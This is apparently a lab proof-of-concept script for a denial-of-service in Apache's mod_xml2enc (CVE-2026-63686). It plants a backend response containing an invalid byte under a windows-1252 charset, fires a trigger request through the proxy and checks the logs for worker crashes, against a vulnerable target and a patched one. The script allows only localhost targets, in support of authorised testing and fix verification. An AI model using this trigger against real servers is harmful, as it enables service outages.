#!/usr/bin/env bash
set -euo pipefail

# Scenario 2 — CVE-2026-63686 mod_xml2enc conversion-failure DoS
# Authorised local lab only. Fixed targets: 127.0.0.1:8080 / 127.0.0.1:8081.
#
# Env:
#   BASE_URL                default http://127.0.0.1:8080
#   EVIDENCE_DIR            default ../report/evidence
#   LABEL                   default xml2enc-vulnerable
#   EXPECT_RESULT           crash (default) | safe
#   APPLY_BACKEND_PATCH     1 (default) | 0
#   RESTORE_BACKEND_ON_EXIT 0 (default) | 1
#   SKIP_BACKEND_BUILD      0 (default) | 1   (use 1 on demo day once image is cached)

BASE_URL="${BASE_URL:-http://127.0.0.1:8080}"
EVIDENCE_DIR="${EVIDENCE_DIR:-../report/evidence}"
LABEL="${LABEL:-xml2enc-vulnerable}"
EXPECT_RESULT="${EXPECT_RESULT:-crash}"
APPLY_BACKEND_PATCH="${APPLY_BACKEND_PATCH:-1}"
RESTORE_BACKEND_ON_EXIT="${RESTORE_BACKEND_ON_EXIT:-0}"
SKIP_BACKEND_BUILD="${SKIP_BACKEND_BUILD:-0}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
BACKEND="$LAB_DIR/backend/app.py"
BACKEND_BAK="$BACKEND.bak-scenario2"

mkdir -p "$EVIDENCE_DIR"
cd "$LAB_DIR"

fail() { echo "[-] ERROR: $*" >&2; exit 1; }

case "$EXPECT_RESULT" in
  crash|safe) ;;
  *) fail "EXPECT_RESULT must be 'crash' or 'safe' (got '$EXPECT_RESULT')" ;;
esac

# Only the authorised lab hosts, and pick the compose service that owns them.
case "$BASE_URL" in
  http://127.0.0.1:8080*) SVC=target ;;
  http://127.0.0.1:8081*) SVC=target-patched ;;
  *) fail "BASE_URL must be http://127.0.0.1:8080 or http://127.0.0.1:8081 (got '$BASE_URL')" ;;
esac
echo "[*] Target service: $SVC ($BASE_URL)"

CRASH_RE='AH00051|AH00052|Segmentation fault|SIGSEGV|child pid [0-9]+ exit'
CONV_RE='xml2enc|convert|iconv'

command -v python3 >/dev/null 2>&1 \
  || fail "host python3 required to patch backend/app.py (xcode-select --install or brew install python)"

restore_backend() {
  set +e
  if [ -f "$BACKEND_BAK" ]; then
    echo "[*] Restoring original backend/app.py"
    cp "$BACKEND_BAK" "$BACKEND"
    docker compose up -d --build backend >/dev/null 2>&1 || true
  fi
}
if [ "$RESTORE_BACKEND_ON_EXIT" = "1" ]; then
  trap restore_backend EXIT
fi

ensure_backend_trigger() {
  if grep -q 'partial-fail' "$BACKEND"; then
    echo "[*] backend/app.py already contains the partial-fail trigger."
    return 0
  fi
  if [ "$APPLY_BACKEND_PATCH" != "1" ]; then
    fail "backend/app.py has no partial-fail trigger and APPLY_BACKEND_PATCH=0."
  fi

  [ -f "$BACKEND_BAK" ] || cp "$BACKEND" "$BACKEND_BAK"
  echo "[*] Patching backend/app.py with the partial-fail trigger..."

  python3 - "$BACKEND" <<'PY'
from pathlib import Path
import re, sys

p = Path(sys.argv[1])
lines = p.read_text().splitlines(keepends=True)

start = None
for i, line in enumerate(lines):
    if line.rstrip("\n") == '        if path == "/scenario":':
        start = i
        break
if start is None:
    raise SystemExit('could not find 8-space if path == "/scenario": block')

end = len(lines)
for j in range(start + 1, len(lines)):
    if re.match(r'^        (if |elif |else:|def |class )', lines[j]):
        end = j
        break

# No backslash escapes: 0x81 is built with bytes([0x81]).
block = (
    '        if path == "/scenario":\n'
    '            qs = parse_qs(parsed.query)\n'
    '            charset = qs.get("charset", ["utf-8"])[0]\n'
    '            charset = "".join(\n'
    '                c for c in charset if c.isalnum() or c in "-_."\n'
    '            )[:40] or "utf-8"\n'
    '\n'
    '            if qs.get("mode", ["benign"])[0] == "partial-fail":\n'
    '                # ASCII/Windows-1252-compatible prefix converts first.\n'
    '                # 0x81 is invalid in glibc WINDOWS-1252 to UTF-8 conversion.\n'
    '                body = (\n'
    '                    b"<!doctype html><html><head><title>ACW3</title></head>"\n'
    '                    b"<body><h1>ACW3 backend</h1><p>valid converted prefix</p>"\n'
    '                    + bytes([0x81]) +\n'
    '                    b"</body></html>"\n'
    '                )\n'
    '            else:\n'
    '                body = SAMPLE_HTML.encode("utf-8")\n'
    '\n'
    '            self._send(body, f"text/html; charset={charset}")\n'
    '            return\n'
)

p.write_text(''.join(lines[:start]) + block + ''.join(lines[end:]))
PY

  python3 -m py_compile "$BACKEND" \
    || fail "patched backend/app.py does not compile; restore $BACKEND_BAK"
}

wait_ready() {
  local n=0
  while [ "$n" -lt 30 ]; do
    curl -fsS "$BASE_URL/proxy/" >/dev/null 2>&1 && return 0
    sleep 1
    n=$((n + 1))
  done
  return 1
}

ensure_backend_trigger

if [ "$SKIP_BACKEND_BUILD" = "1" ]; then
  echo "[*] Skipping backend rebuild (SKIP_BACKEND_BUILD=1)"
else
  echo "[*] Rebuilding backend..."
  docker compose up -d --build backend >/dev/null
fi
wait_ready || fail "$BASE_URL/proxy/ did not become ready"

echo "[*] Benign control against $BASE_URL ..."
CTL_STATUS=$(curl -sS -D "$EVIDENCE_DIR/${LABEL}-control-headers.txt" \
  -o "$EVIDENCE_DIR/${LABEL}-control-body.html" -w '%{http_code}' \
  "$BASE_URL/proxy/scenario?charset=windows-1252&mode=benign")

if [ "$CTL_STATUS" != "200" ] \
   || ! grep -q 'ACW3 backend' "$EVIDENCE_DIR/${LABEL}-control-body.html"; then
  fail "benign control failed (status $CTL_STATUS). Setup invalid."
fi
echo "[+] Benign control OK (200, backend body present)."

echo "[*] Sending partial-fail trigger to $BASE_URL ..."
set +e
curl -v --max-time 10 \
  "$BASE_URL/proxy/scenario?charset=windows-1252&mode=partial-fail" \
  -o "$EVIDENCE_DIR/${LABEL}-trigger-body.bin" \
  2> "$EVIDENCE_DIR/${LABEL}-trigger-client.txt"
CURL_RC=$?
set -e
echo "    curl exit code: $CURL_RC" | tee "$EVIDENCE_DIR/${LABEL}-trigger-curl-exit.txt"

echo "[*] Capturing logs from compose service: $SVC"
docker compose logs --since 10m "$SVC" \
  > "$EVIDENCE_DIR/${LABEL}-server.log" 2>/dev/null || true

CRASHED=0
if grep -Eq "$CRASH_RE" "$EVIDENCE_DIR/${LABEL}-server.log"; then
  CRASHED=1
  echo "[+] Crash evidence found in $SVC log:"
  grep -E "$CRASH_RE" "$EVIDENCE_DIR/${LABEL}-server.log" \
    | tee "$EVIDENCE_DIR/${LABEL}-crash-lines.txt"
else
  echo "[*] No worker-crash evidence in $SVC log."
  grep -E "$CONV_RE" "$EVIDENCE_DIR/${LABEL}-server.log" \
    | tee "$EVIDENCE_DIR/${LABEL}-conversion-lines.txt" || true
fi

case "$EXPECT_RESULT" in
  crash)
    if [ "$CRASHED" = "1" ]; then
      echo "[+] SUCCESS: vulnerable worker crash reproduced on $SVC."
      exit 0
    fi
    echo "[-] FAILURE: expected a worker crash on $SVC, found none."
    exit 3
    ;;
  safe)
    if [ "$CRASHED" = "0" ]; then
      echo "[+] SUCCESS: request handled without a worker crash on $SVC."
      exit 0
    fi
    echo "[-] FAILURE: unexpected crash on $SVC (expected safe handling)."
    exit 4
    ;;
esac